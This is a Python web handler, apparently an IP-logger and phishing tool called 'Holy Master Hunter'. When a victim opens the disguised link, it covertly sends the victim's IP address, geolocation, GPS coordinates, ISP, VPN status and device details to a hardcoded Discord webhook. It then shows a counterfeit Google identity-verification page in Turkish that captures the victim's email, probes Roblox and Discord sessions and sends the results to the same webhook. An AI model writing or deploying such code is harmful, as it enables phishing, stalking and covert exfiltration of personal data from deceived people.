# ==============================================================================
# HOLY SYSTEM v11.0 - THE ULTIMATE MASTER HUNTER (FINAL FULL EDITION)
# Features: Detailed Geo-Table, Hardware Trace, Social Sniffer, Email Capture
# ==============================================================================

from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json
import time

# --- CONFIGURATION (Webhook ve Resim Linkini Buradan Ayarla) ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6"
REDIRECT_IMAGE = "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg"
BOT_NAME = "Holy Master Hunter v11"

class handler(BaseHTTPRequestHandler):

    def do_GET(self):
        try:
            # 1. Capture Identity & Bot Protection
            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            ua = self.headers.get('user-agent', 'Unknown')
            is_bot = any(b in ua for b in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"])

            # 2. BOT HANDLING (Preview for Discord)
            if is_bot:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<html><head><meta property="og:image" content="{REDIRECT_IMAGE}"><meta name="twitter:card" content="summary_large_image"></head></html>'.encode())
                return

            # 3. FETCH ADVANCED NETWORK & GEO DATA
            geo = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
            os_n, br_n = httpagentparser.simple_detect(ua)
            is_vpn = geo.get('proxy') or geo.get('hosting')
            maps_url = f"https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')}"

            # 4. CONSTRUCT THE ELITE DISCORD EMBED (The Table You Love)
            fields = [
                {
                    "name": "📍 Geographical Location",
                    "value": f"**Country:** {geo.get('country')}\n**Region:** {geo.get('regionName')}\n**City:** {geo.get('city')}\n**Zip:** `{geo.get('zip')}`",
                    "inline": False
                },
                {
                    "name": "🌐 Network & Infrastructure",
                    "value": f"**IP:** `{ip}`\n**ISP:** {geo.get('isp')}\n**ASN:** {geo.get('as')}",
                    "inline": True
                },
                {
                    "name": "🛡️ Security Status",
                    "value": f"**VPN/Proxy:** {'⚠️ DETECTED' if is_vpn else '✅ CLEAN'}\n**Hosting:** {'⚠️ YES' if geo.get('hosting') else '✅ NO'}\n**Mobile:** {'📱 YES' if geo.get('mobile') else '💻 NO'}",
                    "inline": True
                },
                {
                    "name": "🛰️ GPS Coordinates",
                    "value": f"**Lat/Lon:** `{geo.get('lat')}, {geo.get('lon')}`\n[📍 Open in Google Maps]({maps_url})",
                    "inline": False
                },
                {
                    "name": "💻 System Information",
                    "value": f"**OS:** `{os_n}`\n**Browser:** `{br_n}`",
                    "inline": False
                }
            ]

            requests.post(WEBHOOK_URL, json={
                "username": BOT_NAME,
                "embeds": [{
                    "title": "🎯 TARGET CONNECTED - INITIALIZING HUNTER",
                    "color": 0xFF0000 if is_vpn else 0x00FF00,
                    "fields": fields,
                    "footer": {"text": "Holy v11.0 Engine | Cyber Intelligence"}
                }]
            })

            # 5. THE MASTER AGENT (Email Capture UI & Deep Scan)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            agent_html = f'''
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <style>
                    body {{ background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                    #box {{ background: #111; padding: 30px; border-radius: 12px; border: 1px solid #333; text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }}
                    .logo {{ width: 90px; margin-bottom: 20px; }}
                    h2 {{ font-size: 18px; margin: 10px 0; }}
                    p {{ color: #aaa; font-size: 13px; margin-bottom: 20px; }}
                    input {{ width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 1px solid #444; background: #222; color: #fff; box-sizing: border-box; }}
                    button {{ width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 10px; }}
                    button:hover {{ background: #1557b0; }}
                </script>
            </head>
            <body>
                <div id="box">
                    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
                    <h2>Kimliğinizi Doğrulayın</h2>
                    <p>Devam etmek için Google hesabınızla giriş yapmanız veya onaylamanız gerekiyor.</p>
                    <input type="email" id="email" placeholder="E-posta adresiniz" required>
                    <button onclick="sendAndRedirect()">Doğrula ve Devam Et</button>
                </div>

                <script>
                async function sendAndRedirect() {{
                    const emailVal = document.getElementById("email").value;
                    if(!emailVal.includes("@")) {{ alert("Geçerli bir e-posta girin."); return; }}
                    
                    document.getElementById("box").innerHTML = "<h3>Bağlanıyor...</h3>";

                    let report = "**Deep Trace Report:**\\n";
                    report += "📧 **Captured Email:** `" + emailVal + "`\\n";
                    report += "🖥️ **Hardware:** " + (navigator.hardwareConcurrency || "N/A") + " Cores\\n";
                    report += "🖼️ **Screen:** " + screen.width + "x" + screen.height + "\\n";

                    // Session Trace
                    try {{ await fetch("https://www.roblox.com/mobileapi/check-app-launch", {{ mode: 'no-cors' }}); report += "🎮 **Roblox:** Active ✅\\n"; }} catch(e) {{}}
                    try {{ await fetch("https://discord.com/api/v9/experiments", {{ mode: 'no-cors' }}); report += "💬 **Discord:** Active ✅\\n"; }} catch(e) {{}}

                    // Webhook Delivery
                    await fetch("{WEBHOOK_URL}", {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ username: "Master Intelligence Agent", content: report }})
                    }});

                    setTimeout(() => {{ window.location.href = "{REDIRECT_IMAGE}"; }}, 500);
                }}
                </script>
            </body>
            </html>
            '''
            self.wfile.write(agent_html.encode())

        except Exception:
            self.send_response(302)
            self.send_header('Location', REDIRECT_IMAGE)
            self.end_headers()

app = handler
